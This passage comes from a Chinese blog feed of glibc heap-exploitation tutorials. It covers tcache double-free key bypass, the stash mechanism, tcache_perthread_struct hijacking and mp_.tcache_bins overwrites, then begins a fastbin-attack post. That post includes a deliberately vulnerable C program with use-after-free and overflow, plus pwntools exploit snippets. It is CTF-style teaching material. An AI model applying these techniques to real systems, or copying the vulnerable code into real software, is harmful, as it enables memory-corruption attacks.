class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">      tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="comment">//汇报错误信息</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">        <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">          <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//通过检查，放入tcahce中</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put(p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><em>所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free</em></p><p>但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 并且我们还需要填满tcache的对应链表才能把chunk释放进fastbin</p><p>好在更新同时带来了stash机制</p><p><em>要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么</em></p><p><em>在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区</em></p><p><em>针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache</em></p><p>而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理</p><p>此时如果哪个bin中含有满足条件的chunk 除了分配这一次请求之外</p><p>其会认为该线程还需要更多类似大小的chunk 为了避免下次继续重复这一步骤 就会将该bin链表中的所有chunk放入到对应tcachebin的链表中</p><p>这个绕过手法存在的意义是因为高版本的tcache对于double free的检查更加严格 是对比整个链表 所以很难利用 如果我们在fastbin中构造好fake chunk 再利用这个机制 就可以继续使用tcachebinattack</p><p>话归正题 开始还是2.27中的问题 由于多了tcachebin 所以会优先进入tcachebin 我们还得先填满tcachebin中的一个链表 才能释放chunk到fastbin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>接着我们先把在tcache中的chunk全部申请回来 然后再构造fake fd</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;testtest&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>在执行到最后一个add的时候 plmalloc在tcache中找不到合适的chunk 而在fastbin中找到了 所以此时就会把fastbin对应的链表转移到tcache中 如图所示</p><p><a href="https://pic.imgdb.cn/item/63f9a6adf144a01007f98563.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9a6adf144a01007f98563.png"></a></p><h2 id="绕过key检查"><a href="#绕过key检查" class="headerlink" title="绕过key检查"></a>绕过key检查</h2><p>还可以直接绕过key的检查来实现tcache的double free 只要能修改到free chunk中的内容就好了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161249266.png" title="image-20230316124903166" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161249266.png" alt="image-20230316124903166"></a></p><p>可以看到所谓的key检查 也就是在tcachebin中的chunk的bk域存入tcache_perthread_struct结构体的地址</p><p>也就是在堆基址处0x251大小的chunk</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161250658.png" title="image-20230316125031626" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161250658.png" alt="image-20230316125031626"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (__glibc_unlikely(e-&gt;key == tcache))</span><br></pre></td></tr></table></figure><p>回顾一下源码对double free的判断 只有key的值等于tcache的时候才会对链表中所有的chunk进行遍历</p><p>如果我们将key值改为其他 就不会进入if中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>如上所示 我们将已经处于tcachebin中的chunk的bk域清空 这样再次free的时候就没有触发double free</p><h2 id="劫持tcache-perthread-struct结构体"><a href="#劫持tcache-perthread-struct结构体" class="headerlink" title="劫持tcache_perthread_struct结构体"></a>劫持tcache_perthread_struct结构体</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line">其中 TCACHE_MAX_BINS的宏定义为</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS   64</span></span><br></pre></td></tr></table></figure><p>从源码定义中可以看到  tcache_perthread_struct主要由两部分构成</p><p>counts数组一共占用64字节 每个字节对应着一个链表 用来存放对应链表中存放着多少个chunk</p><p>entry指针数组则是用来存储每个链表中链表头的chunk地址 一共占用8*64字节</p><p>再加上tcache_perthread_struct的chunk头的0x11字节 就是0x251字节 组成了堆基址的第一个chunk</p><p>这两个数组都能达到攻击效果 下面来演示一下</p><h3 id="counts数组"><a href="#counts数组" class="headerlink" title="counts数组"></a>counts数组</h3><p>我们知道 一个tcache链表中最多存放7个chunk 如果超过这个数 就会根据size将其存放到fastbin或者是unsortedbin 而plammloc判断存放几个chunk 根据的就是count数组中对应的值 如果我们将这个值修改 然后再次释放对应的chunk 就可以不将其释放到tcachebin中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span> )[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>首先我们duoble free一个0x10大小的chunk 这样其fd域就存放着其地址 经过计算 我们就可以得到堆基址</p><p>随后利用UAF 来实现任意地址写 我们任意写的地址挑在tcache_perthread_struct结构体中 目的是为了修改counts数组</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161334839.png" title="image-20230316133408791" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161334839.png" alt="image-20230316133408791"></a></p><p>此时链表结构如图所示 我们再次申请两个chunk</p><p>第二个chunk就指向tcache_perthread_struct结构体 我们将对应0xa0链表的counts修改为7</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p8(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x10</span>,payload)<span class="comment">#2</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>随后申请一个0x90大小的chunk 对应着0xa0的链表 chunk4则是用来防止合并</p><p>释放chunk3以后 会发现 其成功进入了unsortedbin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161338232.png" title="image-20230316133815191" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161338232.png" alt="image-20230316133815191"></a></p><p>于是我们就达到了攻击效果</p><h3 id="entry指针数组"><a href="#entry指针数组" class="headerlink" title="entry指针数组"></a>entry指针数组</h3><p>我们先来随便释放几个不同size的chunk 来观察一下entry数组的情况</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161755879.png" title="image-20230316175545770" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161755879.png" alt="image-20230316175545770"></a></p><p>可以看到其指向的是chunk的用户地址 而非首地址</p><p>接着 我们将0x20链表的entry指针修改一下 然后再次申请0x10大小的chunk 看会分配给我们什么</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161759144.png" title="image-20230316175904089" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161759144.png" alt="image-20230316175904089"></a></p><p>修改的地址调整为tcache_perthread_struct结构体的实际空间首地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161800523.png" title="image-20230316180041486" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303161800523.png" alt="image-20230316180041486"></a></p><p>可以看到 成功任意申请到了tcache_perthread_struct的空间 还有一点可以注意的 </p><p>按照原本的源码逻辑 对应的地址是已经存在chunk头的 所以申请并不会重新覆写 因为在实际任意地址写的时候不用担心chunk头对地址的影响</p><h2 id="mp-tcache-bins"><a href="#mp-tcache-bins" class="headerlink" title="mp_.tcache_bins"></a>mp_.tcache_bins</h2><p>通过覆盖mp_.tcache_bins的值 即可扩大tcachebin的容纳范围 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tcache_get (tc_idx);</span><br><span class="line">      <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到 如果tc_idx 小于 mp_.tcache_bins的话 就会被认为是可以被释放到tcachebin中</p><p>通常适用于largebin attack配合</p><p>下面是索引方式 通过计算偏移可以获得</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201942372.png" title="image-20230320194203338" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201942372.png" alt="image-20230320194203338"></a></p><p>之所以是0x40 对应的是tcache_perthread_struct中entry数组的指针数</p><p>不过将其修改后 释放超过原本大小的chunk进入tcache 并不会被pwndbg调试捕捉到 因为原本的entry数组并没有空间供超范围的chunk使用</p><p>其作用不单单可以运用于使大chunk也能释放进入tcachebin 还可以做到任意写的效果</p><p>正常情况下 一个chunk被释放进入tcachebin  其指针会保存在tcache_perthread_struct中entry数组</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304231626524.png" title="image-20230423162608441" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304231626524.png" alt="image-20230423162608441"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304231626881.png" title="image-20230423162637846" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304231626881.png" alt="image-20230423162637846"></a></p><p>如果利用上面提到的方法 使得更大的chunk被释放到tcachebin中呢  那么原本的entry数组显然没有空间</p><p>于是就会顺着高地址扩展  如果size足够大 就会扩张到高地址处的chunk中 从而这个指针就被我们掌握了 (如果有编辑堆块的办法)  于是就达到了任意写的作用</p><p>比如下面 扩大mp_.tcache_bins的值 </p><p><a href="C:\Users\22346\AppData\Roaming\Typora\typora-user-images\image-20230423163302541.png" title="image-20230423163302541" class="gallery-item"><img src="C:\Users\22346\AppData\Roaming\Typora\typora-user-images\image-20230423163302541.png" alt="image-20230423163302541"></a></p><p>并且释放一个0x500的chunk进入tcachebin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304231634826.png" title="image-20230423163406781" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304231634826.png" alt="image-20230423163406781"></a></p><p>此时这个chunk的entry就会顺着偏移 跑到被我们控制的chunk(物理相邻tcache_perthread_struct)</p><p>如果我们修改这个entry 使其为我们要任意写的地址 再次申请对应大小的chunk 就可以达到任意写的目的</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fastbinattack</title>
      <link href="/2023/02/23/fastbinattack/"/>
      <url>/2023/02/23/fastbinattack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很久没继续写堆部分的博客了  大部分的时间都花在重复性的刷题来掌握牢固低版本glibc的漏洞</p><p>换句话说这段时间一点进步也没有233</p><p>今天突然想起来许久没有更了 那就直接步入正题</p><p>演示程序源码我自己写的 想复现的可以自行编译</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> chunk_time =<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> chunk_size[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> *chunk_ptr[<span class="number">50</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is fucking movie&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is always full of unhappiness, like this question&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Anyway, what&#x27;s your answer&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> size[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you really want?&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(chunk_time&lt;=<span class="number">32</span>&amp;&amp;chunk_time&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!chunk_ptr[chunk_time])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This is the %dth choice in your life\n&quot;</span>,chunk_time);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can customize the size of chunk, but what about your life&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,size,<span class="number">0x8</span>);</span><br><span class="line">        chunk_size[chunk_time] = atoi(size);</span><br><span class="line">        chunk_ptr[chunk_time] = <span class="built_in">malloc</span>(chunk_size[chunk_time]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,chunk_ptr[chunk_time],chunk_size[chunk_time]);</span><br><span class="line">        chunk_time++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s never too late to start again. What do you regret?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_size[index],<span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come back!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_ptr[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t live a perfect life without making any effort&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This program is used to debug heap vulnerabilities&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write by chen&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;You will be stronger next time I see you&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便提供一下exp脚本 方便大家快速开始调试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./testheap&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./testheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./locate_libc2.23&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can customize the size of chunk, but what about your life&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;It&#x27;s never too late to start again. What do you regret?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Come back!&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can&#x27;t live a perfect life without making any effort&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><h2 id="ubuntu16-04-libc2-23"><a href="#ubuntu16-04-libc2-23" class="headerlink" title="ubuntu16.04 libc2.23"></a>ubuntu16.04 libc2.23</h2><p>fastbin的范围是0x20 - 0x80 这里的大小不是用户申请的大小 而是系统实际分配的大小</p><p>fastbin设计的初衷是为了方便小内存chunk的释放和重新分配 为了防止和相邻的chunk合并 所以位于fastbin中的free chunk的PREV_INUSE位不会被设置为0 始终为1</p><p>存放fastbin链表的是malloc_state结构体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line">  /* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br><span class="line">  /* Note this is a bool but not all targets support atomics on booleans.  */</span><br><span class="line">  int have_fastchunks;</span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line">  /* Bitmap of bins */</span><br><span class="line">  unsigned int binmap[BINMAPSIZE];</span><br><span class="line">  /* Linked list */</span><br><span class="line">  struct malloc_state *next;</span><br><span class="line">  /* Linked list for free arenas.  Access to this field is serialized</span><br><span class="line">     by free_list_lock in arena.c.  */</span><br><span class="line">  struct malloc_state *next_free;</span><br><span class="line">  /* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="line">     the free list.  Access to this field is serialized by</span><br><span class="line">     free_list_lock in arena.c.  */</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  /* Memory allocated from the system in this arena.  */</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span 